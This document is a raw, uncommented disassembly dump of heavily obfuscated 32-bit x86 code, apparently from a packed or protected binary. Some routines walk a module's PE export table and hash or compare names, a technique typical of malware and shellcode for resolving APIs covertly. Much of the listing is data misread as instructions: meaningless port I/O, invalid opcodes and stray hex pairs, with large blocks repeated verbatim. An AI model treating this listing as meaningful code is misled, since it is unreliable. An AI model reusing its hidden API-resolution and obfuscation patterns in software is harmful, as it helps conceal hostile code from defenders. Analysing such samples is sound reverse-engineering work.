test eax 0xbe806e10
xchg ebp eax
stosb [ edi ]
int 0x92
sub dh dh
in eax 0x3a
sbb al 0x42
pop esp
inc edx
pop esp
inc edx
jge rwxdata
push 0xd4c6fbc9
cmp ah 0x2e
lea esp [ esp + 0x4 ]
pop ebx
jle rwxdata
jo rwxdata
cwde
int3
cmpsb [ esi ] [ edi ]
cmp esi ecx
adc edx edi
test eax 0x1f49a115
aad 0x3
inc eax
xchg esp eax
sub ch [ ebx - 0x58 ]
mov bh 0x43
pop ecx
sub ch [ ebx + esi * 4 ]

sub_101180a5
cmp edi ebx
call sub_101492d1
pushfd
push ebx
push 0x9b2aff71
lea esp [ esp + 0xc ]
jne rwxdata
call sub_101153b8
cmc
mov edi [ edx + 0x24 ]
pushfd
add edi eax
push 0x280c3e5d
movzx ecx [ edi + ecx * 2 ]
ror di 0x9
call sub_1020ad0d
shld di dx cl
dec di
mov edi [ edx + 0x1c ]
stc
pushfd
pushfd
push ebp
add edi eax
bt sp 0x8
mov edi [ edi + ecx * 4 ]
test cx ax
test edi edi
push [ esp + 0x4 ]
pushfd
call sub_10147cf1
xchg esi eax
dec eax
pshufw mm6 [ ebx + 0x120dbdac ] 0x68
mov bh 0x28
cmp ecx [ 0x10ee1c82 ]
mov dl 0xc
sti
in al 0x96
call 0x4bc7564
out dx eax
sar [ edi ] 0x1
add [ edx ] dh
or al 0xd7
call 0x7e82a5e0
jg rwxdata
in al 0xe7
pushad
or [ ebx + 0x2c17ce7a ] 0xffffffab
adc al 0x4c
std
aad 0x0
inc ebp
xor [ ebp + 0x4a ] 0x46d119fa
out dx eax
push ebp
0x33ac1aa5 0xe244
dec edx
pop ebx
0x97843bb1 0xf378
adc ebx [ ecx - 0x196e3144 ]
scasd [ edi ]
adc [ ebx ] ch
sbb al 0x2c
pop ebp
sub_10118383
pushad
call j_sub_1014b61b
lds ebx [ ebx ]
jecxz rwxdata
lea ecx [ ecx + 0x679d1561 ]
pop ebp
or [ ecx ] ebp
sbb eax 0x80bfa72e
xchg ecx eax
in eax dx
shl [ ecx - 0x1e ] cl
in eax dx
xchg edx eax
sub eax 0x246698a9
xchg edx eax
stosb [ edi ]
mov ebx 0x2ef61ed9
xchg ecx eax
loope rwxdata
dec eax
push ss
lodsb [ esi ]
fcmovbe st3
adc al 0x35
cli
fadd st7
or [ edx ] cl
push ebp
cmp al [ ebp + 0xa9f5e61 ]
adc al 0xb6
stc
js rwxdata
in al 0x19
add al 0xe6
pop esi
jmp 0x7203f217
sbb eax 0xf0f90ce8
out dx al
sbb al 0xc3
clc
sbb [ 0x47d82a55 ] eax
cmp [ ebx + 0x47 ] 0x58
push es
cwde
sub eax 0xffbee091
jno rwxdata
cmp edx eax
mov [ esi - 0x51 ] ss
cwde
or dh cl
push esi
stosb [ edi ]
int 0xd9
and eax 0xd6803e36
mov [ edx + 0x691620cc ] dh
sub cl [ ecx - 0x760dec78 ]
mov bl 0x6d
mov dl 0xbc
arpl [ edx ] bx
jne rwxdata
or [ edi ] 0x8f
pop esp
xchg esi eax
aad 0x60
jle rwxdata
push 0xb3ff8f76
push [ esp + 0x4 ]
mov [ esp + 0x10 ] eax
pushad
push [ esp + 0x30 ]
retn 0x34
sahf
cdq
lodsb [ gs : esi ]
jb rwxdata
out 0xc0 eax
ficom [ edx - 0x1c ]
sbb [ esi ] eax
out dx eax
popfd
push ds
sub al [ edx ]
inc ebp
inc ecx
jpo rwxdata
dec esp
jae rwxdata
aad 0x86
stc
test [ edx ] ebx
xchg esi eax
outsd
xor ch [ edx + edi - 0x5c ]
outsd
shl dh 0x1
jmp 0x813d6f8b
jns rwxdata
ja rwxdata
inc [ edi ]
mov ebp 0x9e015948
test eax 0xac164838
scasd [ edi ]
push esp
imul edx [ edx - 0x9 ] 0xffffffb4
sub al 0xbc
cwde
shr [ ebx + 0x7d170200 ] cl
and [ 0xffffffffbb4d0cf2 ] esi
mov [ 0xffffffffd99866b7 ] eax
0x9d782dc4 0x147
aam 0x34
test eax 0x8f0f8003
sub cl [ ecx ]
cmp bl [ eax + 0x2a1e9def ]
add al [ ebp + 0x41 ]
mov al 0xc1

sub_101189da
push ebp
cmc
sbb bp si
mov ebp esp
clc
sub esp 0x18
sub eax ecx
movzx ax al
shld eax ebp cl
push esi
bswap eax
rcl eax 0x5
push edi
jmp rwxdata
push ebx
movzx eax al
cmc
push edx
pushfd
mov eax [ ebp + 0x8 ]
cmc
test eax eax
pushfd
lea esp [ esp + 0x8 ]
jns rwxdata
call j_sub_1020ae98#2
mov esi [ esp + 0x20 ]
push 0x8767430c
push [ esp + 0x4 ]
pushfd
pushfd
mov ebp [ esp + 0x34 ]
push [ esp ]
pushfd
pushfd
push [ esp + 0x44 ]
retn 0x50
je rwxdata
movsx dx al
je rwxdata
xchg esi edx
inc dx
lea esi [ ecx - 0x65f63bde ]
stc
mov esi [ eax + 0x3c ]
rcr dx 0x3
rcr dh cl
add esi eax
clc
adc dl 0x8f
mov edx [ esi + 0x78 ]
pushfd
test edx edx
mov [ esp ] 0xc1
lea esp [ esp + 0x4 ]
je rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
dec cx
test cl 0x31
rcl cl cl
or cl 0xec
add edx eax
sub cl 0xd9
mov ecx [ esi + 0x7c ]
cmc
clc
add ecx edx
stc
bt ax 0x5
stc
mov [ ebp - 0x10 ] ecx
rcr cx cl
mov ecx [ ebp + 0xc ]
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
call sub_1011e8f7
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_10118ad3
mov bl 0x2
mov [ esp + 0x4 ] al
push 0xc74f559e
pushad
not al
inc ecx
setge al
jmp rwxdata
call sub_102061e6
dec ebx
xchg ebp eax
imul ecx [ eax - 0x35764a83 ] 0x3508d11a
adc esp [ edx ]
mov esp 0xf46bb806

sub_10118fea
pushfd
bt bx 0x6
xor al 0x72
bt edi 0xf
clc
clc
rol al 0x6
test cl 0x74
bt bx 0x4
not al
mov [ esp ] bp
test bh 0x26
add al 0xc7
clc
call sub_10115a39
sub_10119014
movzx eax dl
mov al 0xdd
setg al
lea eax [ rwxdata ]
mov [ esp + 0x4 ] al
push eax
mov [ esp + 0x24 ] rwxdata
push [ esp + 0x4 ]
call sub_1020b434
in al dx
lodsb [ esi ]
adc bl [ ebx + 0x6756e96a ]
cmp edi ecx
salc
add edi 0xc6d8c659
sbb eax 0xdceef0a2
inc edx
adc al 0x4a
sar [ esi ] 0xe8
xchg esi eax
add eax 0x5862fd7a
mov [ edi ] 0x54
dec ebx
pop esp
mov eax [ 0x6a9ee1ae ]
mov ebx 0xf7bb52c5
jns rwxdata
and al 0x4
pop es
out dx al
pop ebp
xor cl [ ebp - 0x7c ]
xor ch [ edx - 0x527295bd ]
int1
add cl [ ebx + 0x34 ]
pop es
inc eax
sub_1011dfe5
push esi
pushad
lea esp [ esp + 0x2c ]
jne rwxdata
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
jmp rwxdata
mov ax 0x71c5
cwde
sub edx edx
bsr ax cx
mov eax edx
bt di ax
add edi 0x1
xor al 0xa9
mov al [ edi ]
pushfd
test al al
jmp rwxdata
lea esp [ esp + 0x4 ]
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
call sub_10116165
or al 0xbb
dec edx
jne rwxdata
add eax [ edx ]
or bh dl
call 0xffffffffb5e06c11
cwde
aaa
add eax 0x79
mov cl 0x97
0x9ae5726d 0xa2bc
inc ecx
jle rwxdata
push esi
push es
and [ ebx + 0x1 ] 0x74
shr [ edi - 0x3d ] 0x1
pop esp
inc ebp
pop ecx
and [ esi ] edi
test [ ebx ] bl
retn 0xb83c
outsb
fadd st2
xchg edi eax
dec eax
jbe rwxdata
jno rwxdata
xor bl [ 0xffffffffd8502d51 ]
int 0x51
cmc
push es
sub [ esi ] edx
cmp eax 0xf77d5702
0xdce8024d 0x9dbd
push ecx
bound eax [ ebp + 0x60b574ca ]
and eax 0x6d8ff90
push ds
xchg al ah
pop edi
jo rwxdata
mov ch 0x60
movsd [ edi ] [ esi ]
jno rwxdata
pop esp
insd
dec esp
neg [ edx ]
clc
cli
cmp al 0x42
jpe rwxdata
aad 0xa9
mov dl ch
sbb al 0xe9
jno rwxdata
jle rwxdata
test al 0x11
iretd
xchg [ ebp + 0x579d2f9e ] ebp
in eax dx
mov edi 0xe8750984
lds edi [ edi + 0x7012d65f ]
outsb
jg rwxdata
pop eax
add al 0x41
jb rwxdata
sbb ah [ eax + edi * 8 - 0x6 ]
les esi [ edx + 0xc ]
sub_1011e0f2
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
inc bl
sub bh al
mov bx [ esi ]
pushfd
cmp si dx
stc
and ebx 0xfff
call j_sub_102057d4
in eax 0x20
[ eax + 0x27 ]
push esp
dec ebx
pop esp
add bh [ edx + 0x1 ]
mov [ 0xffffffff83c45aa5 ] eax
cld
push ss
dec eax
add bl [ esi + edx * 4 + 0x1acd2a8 ]
add al 0xbf
and [ edi + 0x8 ] dl
mov dl [ edx + ecx * 2 + 0x54 ]
mov ax 0xa877
sti
push ebp
mov [ esp ] 0x11
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
jmp rwxdata
add esi 0x2
jmp rwxdata
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_1011e10c
add edx eax
pushfd
push 0x6b907a02
lea esp [ esp + 0x10 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_1011e5a4
lodsb [ esi ]
cmc
not al
stc
jmp rwxdata
stc
test dx ax
sub al 0x59
stc
test ah dh
stc
neg al
mov [ esp ] dh
pushad
sub al 0x9d
sub esp 0xffffffd8
jno rwxdata
stc
cmp al 0x22
bt bp 0xd
clc
shr eax 0x1
call j_sub_101fff69
call sub_1011616c
jmp rwxdata
cmp cl cl
test al 0xc1
cmc
shr eax 0x1
pushad
call sub_10116e0d
dec eax
or [ esi + 0x8 ] dh
call sub_10147230
stc
cmp cl ch
sub ecx ebx
jmp rwxdata
add bl [ ebx + eax * 2 + 0x7c ]
sti
0x80da2b05 0xf01e
dec ebp
push edx
mov ch 0x2a
push eax
dec edi
das
jo rwxdata
push 0xfd272457
lea esp [ esp + 0x4 ]
jne rwxdata
in al dx
add [ esi + 0x18 ] eax
pop ecx
push esp
push ebp
mov ah 0x2b
mov cl 0x69
jbe rwxdata
push edx
push edx
xchg ecx eax
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_1014c55d
pushfd
push 0x64680a47
lea esp [ esp + 0x8 ]
jmp rwxdata
sub esi [ eax + 0xf ]
dec eax
aaa
inc ebx
sbb al 0xee
int1
xor dh [ ecx + 0x67 ]
push 0x81bdc4cb
call sub_10207a6d
pop ss
pushfd
pushfd
call sub_10144293
loope rwxdata
jmp rwxdata
xchg ah bl
clc
sub bl 0xbd
mov eax ebp
pushfd
sbb bl bh
mov bl 0x1
sub esp 0xfffffffc
stc
call sub_101491f0
xor bl 0xfc
dec [ eax + 0x8 ]
jbe rwxdata
fdiv [ ebx - 0x2a0b398e ]
clc
inc ecx
pop ebp
mov [ 0x322dc3a9 ] al
retn 0x2c09
pushfd
dec eax
pushfd
shl eax 0x8
not al
push 0x3695820c
pushfd
lodsb [ esi ]
push 0xe3e5c175
cmc
not al
cmc
sub al 0x59
push 0x5d658544
pushfd
neg al
pushad
bt sp 0x6
clc
mov [ esp + 0x4 ] 0x1335
sub al 0x9d
push 0x6a86e1a5
jmp rwxdata
lahf
mov edx 0xeb683744
push esp
mov dh 0xdc
add dl [ esi + 0x44 ]
and ecx ebx
test eax 0x3744ba9f
push 0x5c0254eb
inc ebx
jl rwxdata
lea esp [ esp + 0x48 ]
call sub_1014c55d
push ecx
push 0x686be2cd
cmp eax 0x7d00
lea esp [ esp + 0x8 ]
jge rwxdata
pushad
pushfd
mov [ esp + 0x4 ] 0xe3
lea esp [ esp + 0x24 ]
jae rwxdata
jae rwxdata
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbfe735f8
inc ecx
add esp 0x4
rcl bl cl
cmc
xchg ebp eax
pushad
call j_sub_1011701f
stosb [ edi ]
enter 0x71ee 0x75
imul edi [ edx + 0x3a ] 0xda6e4938
add eax 0xd185ba99
lea edi [ ecx ]
lds ebp [ ecx - 0x44f02f8a ]
arpl [ eax ] di
inc edi
jmp rwxdata
clc
push 0x496c45e7
jmp sub_10117f5e
sti
inc esp
push ecx
insd
enter 0xa076 0xbe
push edx
insd
push ebp
dec edx
retn
sub_1011e8f7
mov [ esp ] ah
cmp ecx 0xffff
pushad
lea esp [ esp + 0x24 ]
jbe rwxdata
cmc
sub ecx [ edx + 0x10 ]
test sp bp
stc
cmp ecx [ edx + 0x14 ]
je rwxdata
rol di 0xa
rcl bh 0x2
pushfd
rcr di 0x2
mov edi [ edx + 0x24 ]
pushad
btr bx dx
add edi eax
setle bh
inc cx
mov ebx [ edx + 0x20 ]
lea ecx [ eax + 0x418683da ]
ror ch 0x7
add ebx eax
lea ecx [ ecx - 0x133d05ad ]
mov [ ebp - 0x8 ] 0x0
neg cx
sub ch cl
pop ecx
mov ecx [ edx + 0x18 ]
sub esp 0xffffffe0
clc
call sub_1014720b
cmp al 0x9
jmp rwxdata
pushfd
call sub_101164b1
bt di 0x9
pushad
pushfd
pushad
add ecx 0xffffffff
push 0xb06ce317
jmp sub_10208dbc
pushad
push [ esp ]
lea esp [ esp + 0x24 ]
jae rwxdata
mov [ esp + 0x8 ] 0x5b
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
ja rwxdata
movsx dx al
je rwxdata
pushfd
mov [ esp ] 0xa2
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
push edi
pushad
call sub_10201207
pushfd
bt ebx ebx
stc
imul edx edx 0xa
clc
cmc
add edx eax
push [ esp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
shld di dx cl
dec di
mov edi [ edx + 0x1c ]
stc
pushfd
pushfd
push ebp
add edi eax
bt sp 0x8
mov edi [ edi + ecx * 4 ]
test cx ax
test edi edi
push [ esp + 0x4 ]
pushfd
call sub_10147cf1
xchg esi eax
dec eax
pshufw mm6 [ ebx + 0x120dbdac ] 0x68
mov bh 0x28
cmp ecx [ 0x10ee1c82 ]
mov dl 0xc
sti
in al 0x96
call 0x4bc7564
out dx eax
sar [ edi ] 0x1
add [ edx ] dh
or al 0xd7
call 0x7e82a5e0
jg rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
in al 0xe7
pushad
or [ ebx + 0x2c17ce7a ] 0xffffffab
adc al 0x4c
std
aad 0x0
inc ebp
xor [ ebp + 0x4a ] 0x46d119fa
out dx eax
push ebp
0x33ac1aa5 0xe244
dec edx
pop ebx
0x97843bb1 0xf378
adc ebx [ ecx - 0x196e3144 ]
scasd [ edi ]
adc [ ebx ] ch
sbb al 0x2c
pop ebp
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_1011ebf1
call sub_10115c87
mov [ esp ] 0xe6
lea esp [ esp + 0x4 ]
ja rwxdata
push edi
pushad
call sub_10201207
pushad
jmp rwxdata
imul edx edx 0xa
pushfd
push edi
stc
add edx eax
pushfd
pushfd
push edx
push esp
lea esp [ esp + 0x38 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_1011ec0a
shl al cl
pushfd
not al
mov al [ edi ]
pushfd
clc
cmp al 0x41
pushfd
pushfd
lea esp [ esp + 0x10 ]
jb rwxdata
inc ah
ror ah cl
mov ah [ esi ]
stc
cmp bl cl
cmp ah 0x41
pushfd
mov [ esp ] 0xea21
push ebp
lea esp [ esp + 0x8 ]
jb rwxdata
jmp j_sub_101162e2
push esp
cmc
mov [ esp ] 0xd5ce
test dl bl
or al al
call sub_102000c8
movsx si al
mov esi [ ebp + 0xc ]
jmp sub_10201df6
bt dx 0xb
push 0x5466910a
cmp ah 0x5a
jmp rwxdata
mov [ esp ] di
lea esp [ esp + 0x4 ]
ja rwxdata
bt cx 0xd
test ch 0x9a
jmp sub_101444e1
sub_1011ecd9
mov [ esp ] 0xb3
pushfd
mov [ esp + 0x20 ] rwxdata
jmp rwxdata
push 0x1b28e909
pushad
jmp rwxdata
mov [ esp + 0x40 ] eax
mov [ esp + 0x4 ] dh
push edx
pushfd
pushfd
push [ esp + 0x4c ]
retn 0x50
sub_1011ee26
mov [ esp + 0x28 ] eax
setbe al
setae al
mov [ esp ] bl
lodsb [ esi ]
call sub_101165e5
dec eax
mov ebp 0xb89ec162
cmpsb [ esi ] [ edi ]
sti
mov [ 0x4404183f ] al
add bl [ si - 0x63 ]
leave
jbe rwxdata
sub [ eax - 0x2f52e37b ] ecx
loope rwxdata
mov esi eax
jne rwxdata
0x2c5267d7 0xd1ae
jmp 0x8937e8b0
into
inc edi
imul esi esp 0x5da8216e
pop esi
push edi
insd
cmp [ esi ] ecx
dec edx
0xe0e86ba4 0x8314
nop
mov ah 0x81
pop ebp
fldenv [ ebp - 0x62bd7ec2 ]
jno rwxdata
dec esi
add [ 0xffffffff9a05f905 ] al
xlat
push edx
sub al 0xae
shr ecx 0x1
xor eax 0x67925fa
fmulp st1
mov bh 0xa8
test dh bl
dec edi
jo rwxdata
mov ch 0xb
pushfd
mov eax 0x81f9e876
sbb eax 0xa5f9613d
and eax 0xad3dc295
0xcdfe63bc 0x6009
pop ss
out 0x39 al
dec edx
cmp bl dl
mov [ 0xfffffffffa4d3687 ] eax
jne rwxdata
mov ebx 0x62c7b7c3
sbb eax 0x27ccf271
inc esp
retn 0xd1cd
sub_1011f098
call sub_10115d84
enter 0x6ff 0xd8
cmp al 0xa2
jecxz rwxdata
shr [ eax + edx * 4 + 0x19193bfd ] cl
cmpsb [ esi ] [ edi ]
mov bh 0x8a
xchg ebp eax
0x80fa9685 0xb371
sbb eax 0x6243059e
cld
loop rwxdata
salc
ficomp [ edi + edi * 2 - 0x3d ]
pop esp
cmp [ ebp + 0x21 ] 0xf8b76f5e
fild [ fs : ebx - 0x76 ]
mov ah 0x14
faddp st4
movsd [ edi ] [ esi ]
jge rwxdata
jno rwxdata
inc edx
pop esp
outsb
mov al 0x86
clc
add [ ebx - 0x6b ] cl
imul ecx [ eax - 0x35764a83 ] 0x3508d11a
adc esp [ edx ]
mov esp 0xf46bb806

insb
push ebx
dec esp
sar [ 0x7ccc6892 ] 0xaf
nop
dec esp
xor edi esp
and ebx [ edi - 0x6391b000 ]
inc ebx
into
push eax
xchg ecx eax
scasb [ edi ]
[ edi ]
mov al [ 0xffffffff92edb154 ]
mov ebx 0xa9f866c3
cmc
push es
jno rwxdata
mov ss [ edi ]
out 0xfb eax
test [ ebp + 0x45 ] esp
cwde
sbb ebp ebx
add [ edi ] ah
xlat
xchg edi eax
jo rwxdata
int1
neg [ eax - 0x7d17338e ]
jo rwxdata
and bh [ esi + eax - 0x340b9448 ]
aam 0xc7
mov eax 0x9c83ac52
mov esi 0xffe49ae0
shr [ ebx - 0x65e39c0c ] 0x64
test eax 0x7e806655
add al 0x1d
add [ ebx ] eax
sti
or esi esi
sub [ ebx + 0x42f65544 ] bl
push cs
or bl cl
mov dh 0x88
push cs
into
push eax
jb rwxdata
xchg edi eax
pop es
add ebx esp
fld [ ecx ]
adc al 0x4a
mov esi [ ecx + 0x69 ]
xor [ cs : 0xfffffffff3b28c79 ] eax
cdq
insb
cmp ecx [ ebx + 0x2f ]
or al 0x51
int 0xfd
and [ edi + 0x7 ] ebx
sub_1011f2b5
pop ecx
rol ch cl
neg cl
mov ecx 0x104
pushfd
pushad
pushfd
sub al al
pushfd
push [ esp + 0x10 ]
push [ esp ]
stc
[ edi ]
pushfd
lea esp [ esp + 0x38 ]
jne rwxdata
movsx dx al
je rwxdata
sar ch 0x7
adc cl ah
mov ecx edi
call sub_101443c1
int3
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_101441d3
lea esp [ esp + 0x4 ]
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
